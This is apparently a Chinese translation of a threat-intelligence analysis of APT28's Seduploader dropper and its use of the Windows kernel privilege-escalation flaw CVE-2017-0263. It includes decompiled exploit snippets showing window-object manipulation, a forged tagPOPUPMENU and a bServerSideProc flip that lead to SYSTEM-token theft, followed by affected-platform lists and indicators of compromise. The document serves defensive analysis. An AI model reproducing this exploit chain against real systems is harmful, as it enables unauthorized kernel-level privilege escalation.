@@ -1,0 +1,136 @@
+如上所述，为了部署Seduploader有效负载，Seduploader病毒释放器通过利用一个LPE漏洞CVE-2017-0263获取了系统权限。本部分我们将会说明APT28黑客组织是如何利用这个漏洞的。
+首先，即使这个漏洞影响Windows 7及以上版本（见文末受影响平台清单），但这个漏洞旨在避开在Windows 8.1及以上版本中运行。
+由于这个利用能同时针对32位和64位平台，它首先会判断这个进程是否在WOW64下运行。这个利用会分配多个页面直到找到一个高数值地址
+(0x02010000)。随后它会构建如下结构：
+    struct Payload
+     {
+       LONG PTEAddress;               // Points to the PTE entry containing the physical address of the page containing our structure. Only used for windows 8+
+       LONG pid;                      // Injected process pid;
+       LONG offset_of_lpszMenuName;   // Offset of the lpszMenuName in the win32k!tagCLS structure
+       LONG offset_of_tagTHREADINFO;  // Offset of the pti field in the win32k!tagWND structure.
+       LONG offset_of_tagPROCESSINFO; // Offset of the ppi field in the win32k!tagTHREADINFO structure.
+       LONG offset_of_TOKEN;          // Offset of the Token field in the nt!_EPROCESS structure.
+       LONG tagCLS[0x100];            // Array containing the tagCLS of the created windows.
+       LONG WndProcCode;              // Code of the WndProc meant to be run in kernel mode.
+     };
+随后，它将检索HMValidateHandle的地址。这个功能能让攻击者泄露一个tagWND对象的内核地址。
+如下概览了余下利用如何运作：
+这个利用将会创建256个随机视窗类别以及相关视窗。每个视窗将会有512个外加存储器。这个额外内存临近内核空间的tagWND对象。在第一个创建的视窗后也就是在外加存储器中，这个利用会构建一个包含多数只有它自己的地址随后才会使用的虚假对象，如下所示：
+当所有的视窗都创建好之后，这个利用会分配2个额外的视窗。第一个视窗的作用是在内核线程中执行：我们姑且将这个视图称作KernelWnd，而另外一个主要是接收完成这个利用所需要的必要信息：我们姑且将这个视窗称作TargetWindow。然后，这个利用会关联带有新分配对象KernelWnd的程序。
+    // …
+    TargetWindow = CreateWindowExW(0x80088u, MainWindowClass, 0, WS_VISIBLE, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);
+    KernelWnd = CreateWindowExW(0, MainWindowClass, 0, 0, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);
+    // …
+    SetWindowLongW(KernelWnd, GWL_WNDPROC, (LONG)Payload_0->WndProc);
+我们在win32k组件的行为中添加一些上下文。每次你通过CreateWindowExW创建一个新窗口时，驱动都会在内核中创建一个新的tagWND对象。这个对象可描述为（为清晰起见，删除了一些字段）：
+    kd> dt tagWND
+     win32k!tagWND
+       +0x000 head             : _THRDESKHEAD
+       +0x028 state            : Uint4B
+       // ...
+       +0x028 bServerSideWindowProc : Pos 18, 1 Bit
+       // ...
+       +0x042 fnid             : Uint2B
+       +0x048 spwndNext        : Ptr64 tagWND
+       +0x050 spwndPrev        : Ptr64 tagWND
+       +0x058 spwndParent      : Ptr64 tagWND
+       +0x060 spwndChild       : Ptr64 tagWND
+       +0x068 spwndOwner       : Ptr64 tagWND
+       +0x070 rcWindow         : tagRECT
+       +0x080 rcClient         : tagRECT
+       +0x090 lpfnWndProc      : Ptr64     int64
+       +0x098 pcls             : Ptr64 tagCLS
+       // ...
+从中可看出，tagWND->lpfnWindowProc包含跟这个视窗相关联的程序地址。这个驱动通常会降级其权限在用户上下文中执行这个程序。该行为是由位
+tagWND->bServerSideProc控制的。如果这个位被设置，那么这个程序会通过升级权限进行运行，也就是在内核中运行。通过翻转tagWND->bServerSideProc位，利用就会运行。攻击者所需要做的就是找到翻转的方式。
+在破坏目录的过程中，前面设置的钩子会查看对象的类别是否是如下代码块中所示的SysShadow。如是，则它会用自己的程序替代关联程序。
+     GetClassNameW(tagCWPSTRUCT->hwnd, &ClassName, 20);
+     if ( !wcscmp(&ClassName, STR_SysShadow) )
+     {
+       if ( ++MenuIndex == 3 )
+       {
+         // tagWND
+         ::wParam = *(_DWORD *)(FN_LeakHandle((int)hWnd[0]) + sizeof_tagWND_0);
+         // Replace the WndProc of the object
+         SetWindowLongW(tagCWPSTRUCT->hwnd, GWL_WNDPROC, (LONG)FN_TriggerExploit);
+       }
+在这个程序中，我们可发现这个利用在寻找WM_NCDESTROY信息。如果要求符合，那么它会构建一个由如下伪码说明的恶意tagPOPUPMENU对象：
+    if ( Msg == WM_NCDESTROY )
+     {
+       struct tagPOPUPMENU *pm = BuildFakeObject();
+       SetClassLongW(..., pm);
+     }
+注意，用于构建这个对象的地址存在于我们首个tagWND末尾分配的外加存储器中。随后，这个利用会调用 NtUserMNDragLeave来翻转
+KernelWnd对象的bServerSideProc位。为此，这个函数会检索使用tagTHREADINFO结构的一个tagMENUSTATE对象。这个对象包含被毁灭的菜单对象地址
+(tagMENUSTATE->pGlobalPopupMenu)。
+可看出，tagPOPUPMENU
+是我们在调用NtUserMNDragLeave前在用户空间中编制的恶意对象。查看恶意tagPOPUPMENU的字段就能发现它们都指向外加存储器，但有一个例外，它指向了我们的KernelWnd对象。
+从这里我们可发现，执行会到达函数MNFreePopup，它会将指针指向一个tagPOPUPMENU
+对象。最终这个函数会调用HMAssignmentUnlock，将字段 spwndNextPopup 和spwndPrevPopup作为参数传递：
+    ; win32k!HMAssignmentUnlock
+     sub     rsp,28h
+     mov     rdx,qword ptr [rcx]
+     and     qword ptr [rcx],0
+     test    rdx,rdx
+     je      win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
+     add     dword ptr [rdx+8],0FFFFFFFFh ; Flipping bServerSideProc
+     jne     win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
+     movzx   eax,word ptr [rdx]
+执行这个系统调用后，我们的tagWND结构会跟我们的KernelWnd进行如下关联：
+一切设置就绪！这个利用只需要发送正确的信息就能以内核模式触发程序执行。
+    syscall(NtUserMNDragLeave, 0, 0);
+     // Send a message to the procedure in order to trigger its execution in kernel mode.
+     KernelCallbackResult = SendMessageW(KernelWnd, 0x9F9Fu, ::wParam, 0);
+     Status.Triggered = KernelCallbackResult == 0x9F9F;
+     if ( KernelCallbackResult != 0x9F9F )
+       // Error, try again.
+       PostMessageW(TargetWindow, 0xABCDu, 0, 0);
+最后，以升级权限运行的视窗程序会窃取SYSTEM口令并将其添加到调用进程。成功运行这个利用后，FLTLDR.EXE应该会以系统权限运行，并将会安装Seduploader的有效负载。
+**总结**
+这次攻击表明APT28并未停止攻击活动。他们仍然“旧习难改”：使用已知的攻击方法、复用来自其它恶意软件或公开站点的代码并犯一些小错误如在Seduploader的配置（shel而不是shell）的输入错误。
+不变的事实还有，他们再次改进了工具集，比如这次添加了一些内置功能如截屏器并将两个0day利用整合到网络武器中。
+**微软发布的受CVE-2017-0262和CVE-2017-0263影响的平台**
+**CVE-2017-0262**
+Microsoft Office 2010 Service Pack 2 （32位版本）
+Microsoft Office 2010 Service Pack 2 （64位版本）
+Microsoft Office 2013 Service Pack 1 （32位版本）
+Microsoft Office 2013 Service Pack 1 （64位版本）
+Microsoft Office 2013 RT Service Pack 1
+Microsoft Office 2016 （32位版本）
+Microsoft Office 2016（64位版本）
+**CVE-2017-0263**
+Windows 7 for 32-bit Systems Service Pack 1
+Windows 7 for x64-based Systems Service Pack 1
+Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
+installation)
+Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
+Windows Server 2008 R2 for x64-based Systems Service Pack 1
+Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core
+installation)
+Windows Server 2012
+Windows Server 2012 (Server Core installation)
+Windows 8.1 for 32-bit systems
+Windows 8.1 for x64-based systems
+Windows Server 2012 R2
+Windows RT 8.1
+Windows Server 2012 R2 (Server Core installation)
+Windows 10 for 32-bit Systems
+Windows 10 for x64-based Systems
+Windows 10 Version 1511 for x64-based Systems
+Windows 10 Version 1511 for 32-bit Systems
+Windows Server 2016
+Windows 10 Version 1607 for 32-bit Systems
+Windows 10 Version 1607 for x64-based Systems
+Windows Server 2016 (Server Core installation)
+Windows 10 Version 1703 for 32-bit Systems
+Windows 10 Version 1703 for x64-based Systems
+Windows Server 2008 for Itanium-Based Systems Service Pack 2
+Windows Server 2008 for 32-bit Systems Service Pack 2
+Windows Server 2008 for x64-based Systems Service Pack 2<
+Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
+installation)
+**IoC（攻陷指标）**
+**互斥量**
+flPGdvyhPykxGvhDOAZnU
+**注册表键**
+    HKCUSoftwareMicrosoftOffice testSpecialPerf
